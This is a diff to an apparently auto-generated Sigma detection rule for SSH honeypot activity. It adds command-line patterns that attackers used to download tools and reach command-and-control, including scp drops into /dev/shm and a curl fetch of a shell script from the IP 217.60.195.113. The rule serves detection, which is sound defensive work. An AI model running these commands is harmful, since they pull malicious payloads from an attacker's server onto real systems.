@@ -2,8 +2,8 @@ title: Honeypot - SSH Tool Download/C2
 id: e5c85171-80ce-5850-8638-9536aa39f4e9
 status: experimental
 level: critical
-description: Tool download or C2 related commands from SSH honeypot. 4 events, 1 source
-  IPs, 1 unique patterns.
+description: Tool download or C2 related commands from SSH honeypot. 87 events, 3
+  source IPs, 15 unique patterns.
 author: LLM Honeypot Intelligence Platform (automated)
 date: 2026/06/14
 references:
@@ -17,7 +17,21 @@ logsource:
 detection:
   selection:
     CommandLine|contains:
-    - curl -s --connect-timeout 2 ipinfo.io/country 2>/dev/null
+    - curl ipinfo.io/org
+    - scp -qt "/dev/shm/GnHyjver
+    - scp -qt "/dev/shm/ePZBBbBI
+    - scp -t /usr/local/bin/dms55c76xpps2yz3u0j18tgwhu
+    - scp -qt "/dev/shm/PlRKnTbE
+    - scp -t ~/dms55c76xpps2yz3u0j18tgwhu
+    - scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh
+    - scp -qt "/dev/shm/vuldQlDy
+    - scp -qt "/dev/shm/waUncNSL
+    - curl -sk https://217.60.195.113/sh
+    - scp -qt "/dev/shm/DNqgjaNK
+    - scp -t /usr/bin/dms55c76xpps2yz3u0j18tgwhu
+    - scp -qt "/dev/shm/jcYCWDOB
+    - scp -qt "/dev/shm/lKxXPpzx
+    - scp -qt "/dev/shm/wDNCJKjh
   condition: selection
 falsepositives:
 - Legitimate system administration
